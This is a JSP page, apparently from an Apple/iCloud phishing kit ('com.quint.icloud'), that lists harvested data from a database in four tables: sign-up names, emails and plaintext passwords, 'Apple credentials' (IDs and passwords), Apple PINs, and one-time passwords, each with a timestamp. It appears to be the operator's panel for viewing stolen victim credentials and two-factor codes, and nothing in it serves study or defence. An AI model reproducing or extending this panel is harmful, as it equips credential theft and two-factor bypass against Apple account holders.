<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
    <%@ page import="java.sql.*,com.quint.icloud.*" %>
	<%
		int a=0, b=0, c=0, d=0;
	%>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Data</title>
        
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

        <!-- Bootstrap CSS -->
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

        <!-- Style.css -->
        <link rel="stylesheet" href="style.css">
    </head>
<body>
    <div class="container text-center">
        <div class="title">
            <h1>SIGN UP</h1>
        </div>
        <table class="table table-dark">
            <thead>
              <tr>
                <th scope="col">#</th>
                <th scope="col">NAME</th>
                <th scope="col">EMAIL</th>
                <th scope="col">PASSWORD</th>
                <th scope="col">DATE & TIME</th>
              </tr>
            </thead>
            <tbody>
            <% 
            	ResultSet rs1 = Dao.getSignup();
            	while(rs1.next())
            	{
            %>
              <tr>
                <th><%= ++a %></th>
                <td><%= rs1.getString(1) %></td>
                <td><%= rs1.getString(2) %></td>
                <td><%= rs1.getString(3) %></td>
                <td><%= rs1.getString(4) %></td>
              </tr>
            <%
            	}
            	rs1.close();
            	ConnectionModel.getConnection().close();
            %>
            </tbody>
          </table>
    </div>

    <div class="container text-center">
        <div class="title">
            <h1>APPLE CREDENTIALS</h1>
        </div>
        <table class="table table-dark">
            <thead>
              <tr>
                <th scope="col">#</th>
                <th scope="col">ID</th>
                <th scope="col">PASSWORD</th>
                <th scope="col">DATE & TIME</th>
              </tr>
            </thead>
            <tbody>
            <% 
            	ResultSet rs2 = Dao.getApple();
            	while(rs2.next())
            	{
            %>
              <tr>
                <th><%= ++b %></th>
                <td><%= rs2.getString(1) %></td>
                <td><%= rs2.getString(2) %></td>
                <td><%= rs2.getString(3) %></td>
              </tr>
            <%
            	}
            	rs2.close();
            	ConnectionModel.getConnection().close();
            %>
            </tbody>
          </table>
    </div>
    
    <div class="container text-center">
        <div class="title">
            <h1>Apple PIN</h1>
        </div>
        <table class="table table-dark">
            <thead>
              <tr>
                <th scope="col">#</th>
                <th scope="col">PIN</th>
                <th scope="col">DATE & TIME</th>
              </tr>
            </thead>
            <tbody>
            <% 
            	ResultSet rs4 = Dao.getPin();
            	while(rs4.next())
            	{
            %>
              <tr>
                <th><%= ++d %></th>
                <td><%= rs4.getString(1) %></td>
                <td><%= rs4.getString(2) %></td>
              </tr>
            <%
            	}
            	rs4.close();
            	ConnectionModel.getConnection().close();
            %>
            </tbody>
          </table>
    </div>

    <div class="container text-center">
        <div class="title">
            <h1>ONE TIME PASSWORD</h1>
        </div>
        <table class="table table-dark">
            <thead>
              <tr>
                <th scope="col">#</th>
                <th scope="col">OTP</th>
                <th scope="col">DATE & TIME</th>
              </tr>
            </thead>
            <tbody>
            <% 
            	ResultSet rs3 = Dao.getOTP();
            	while(rs3.next())
            	{
            %>
              <tr>
                <th><%= ++c %></th>
                <td><%= rs3.getString(1) %></td>
                <td><%= rs3.getString(2) %></td>
              </tr>
            <%
            	}
            	rs3.close();
            	ConnectionModel.getConnection().close();
            %>
            </tbody>
          </table>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</body>
</html>